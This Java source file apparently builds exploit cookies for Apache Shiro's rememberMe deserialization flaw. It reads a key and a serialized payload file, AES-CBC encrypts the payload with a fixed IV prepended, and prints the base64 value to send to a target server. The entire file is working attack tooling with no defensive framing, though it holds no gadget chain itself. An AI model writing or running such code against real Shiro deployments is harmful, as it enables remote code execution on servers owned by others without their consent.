import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class EncryptShiroPayload {
    public static void main(String[] args) throws Exception {
        if (args.length != 2) {
            System.err.println("Usage: EncryptShiroPayload <base64-key> <payload-file>");
            System.exit(1);
        }

        byte[] key = Base64.getDecoder().decode(args[0]);
        byte[] payload = Files.readAllBytes(Paths.get(args[1]));

        byte[] iv = new byte[] {
            0x01, 0x23, 0x45, 0x67, 0x11, 0x22, 0x33, 0x44,
            0x55, 0x66, 0x77, 0x21, 0x43, 0x65, 0x12, 0x34
        };

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
        byte[] encrypted = cipher.doFinal(payload);

        byte[] out = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, out, 0, iv.length);
        System.arraycopy(encrypted, 0, out, iv.length, encrypted.length);
        System.out.println(Base64.getEncoder().encodeToString(out));
    }
}
